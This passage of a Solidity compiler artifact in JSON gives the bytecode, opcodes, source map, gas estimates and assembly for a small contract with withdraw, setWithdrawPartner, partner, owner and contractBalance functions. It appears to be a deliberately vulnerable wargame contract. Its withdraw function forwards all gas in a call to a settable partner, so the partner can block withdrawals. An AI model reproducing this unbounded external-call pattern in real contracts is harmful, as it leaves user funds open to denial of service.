5b610a9e81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006103ee83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061047e565b905092915050565b600080828401905083811015610474576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b6000808311829061052a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156104ef5780820151818401526020810190506104d4565b50505050905090810190601f16801561051c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858161053657fe5b04905080915050939250505056fea2646970667358221220c3e1d1f0a9287622a27cbe84f75639c9e24f22de79cddac85b10e148ec0333d064736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x57A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x4E1C5914 EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8B7AFE2E EQ PUSH2 0xC2 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xED JUMPI DUP1 PUSH4 0xBE10862B EQ PUSH2 0x12E JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x16F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC0 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x337 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xCE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD7 PUSH2 0x37A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x102 PUSH2 0x382 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x143 PUSH2 0x388 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x185 PUSH1 0x64 SELFBALANCE PUSH2 0x3AC SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x205 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x20A JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0xA9E PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP3 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x255 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP TIMESTAMP PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH2 0x2D0 DUP2 PUSH1 0x2 PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x3F6 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0xA9E DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3EE DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x47E JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x474 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x52A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x4EF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x4D4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x51C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x536 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC3 0xE1 0xD1 CREATE 0xA9 0x28 PUSH23 0x22A27CBE84F75639C9E24F22DE79CDDAC85B10E148EC03 CALLER 0xD0 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "176:1166:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061004e5760003560e01c80633ccfd60b1461005a5780634e1c5914146100715780638b7afe2e146100c25780638da5cb5b146100ed578063be10862b1461012e57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f61016f565b005b34801561007d57600080fd5b506100c06004803603602081101561009457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610337565b005b3480156100ce57600080fd5b506100d761037a565b6040518082815260200191505060405180910390f35b3480156100f957600080fd5b50610102610382565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561013a57600080fd5b50610143610388565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60006101856064476103ac90919063ffffffff16565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610205576040519150601f19603f3d011682016040523d82523d6000602084013e61020a565b606091505b505050610a9e73ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610255573d6000803e3d6000fd5b50426001819055506102d081600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546103f690919063ffffffff16565b600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600047905090565b610a9e81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006103ee83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061047e565b905092915050565b600080828401905083811015610474576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b6000808311829061052a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156104ef5780820151818401526020810190506104d4565b50505050905090810190601f16801561051c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858161053657fe5b04905080915050939250505056fea2646970667358221220c3e1d1f0a9287622a27cbe84f75639c9e24f22de79cddac85b10e148ec0333d064736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x4E1C5914 EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8B7AFE2E EQ PUSH2 0xC2 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xED JUMPI DUP1 PUSH4 0xBE10862B EQ PUSH2 0x12E JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x16F JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC0 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x337 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xCE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD7 PUSH2 0x37A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x102 PUSH2 0x382 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x143 PUSH2 0x388 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x185 PUSH1 0x64 SELFBALANCE PUSH2 0x3AC SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x205 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x20A JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0xA9E PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP3 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x255 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP TIMESTAMP PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH2 0x2D0 DUP2 PUSH1 0x2 PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x3F6 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0xA9E DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3EE DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x47E JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x474 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x52A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x4EF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x4D4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x51C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x536 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC3 0xE1 0xD1 CREATE 0xA9 0x28 PUSH23 0x22A27CBE84F75639C9E24F22DE79CDDAC85B10E148EC03 CALLER 0xD0 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "176:1166:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;648:485;;;;;;;;;;;;;:::i;:::-;;501:90;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;1238:101;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;319:54;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;234:22;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;648:485;686:17;706:30;732:3;706:21;:25;;:30;;;;:::i;:::-;686:50;;873:7;;;;;;;;;;:12;;892;873:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;367:5;920:14;;:28;935:12;920:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1026:3;1006:17;:23;;;;1075:50;1112:12;1075:23;:32;1099:7;;;;;;;;;;;1075:32;;;;;;;;;;;;;;;;:36;;:50;;;;:::i;:::-;1040:23;:32;1064:7;;;;;;;;;;;1040:32;;;;;;;;;;;;;;;:85;;;;648:485;:::o;501:90::-;575:8;565:7;;:18;;;;;;;;;;;;;;;;;;501:90;:::o;1238:101::-;1286:4;1310:21;1303:28;;1238:101;:::o;319:54::-;367:5;319:54;:::o;234:22::-;;;;;;;;;;;;:::o;3101:130:2:-;3159:7;3185:39;3189:1;3192;3185:39;;;;;;;;;;;;;;;;;:3;:39::i;:::-;3178:46;;3101:130;;;;:::o;874:176::-;932:7;951:9;967:1;963;:5;951:17;;991:1;986;:6;;978:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1042:1;1035:8;;;874:176;;;;:::o;3713:272::-;3799:7;3830:1;3826;:5;3833:12;3818:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3856:9;3872:1;3868;:5;;;;;;3856:17;;3977:1;3970:8;;;3713:272;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "280400",
								"executionCost": "318",
								"totalCost": "280718"
							},
							"external": {
								"contractBalance()": "237",
								"owner()": "255",
								"partner()": "1110",
								"setWithdrawPartner(address)": "21101",
								"withdraw()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 176,
									"end": 1342,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c3e1d1f0a9287622a27cbe84f75639c9e24f22de79cddac85b10e148ec0333d064736f6c634300060c0033",
									".code": [
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "3CCFD60B"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "EQ",
											"source": 0
										},
										{
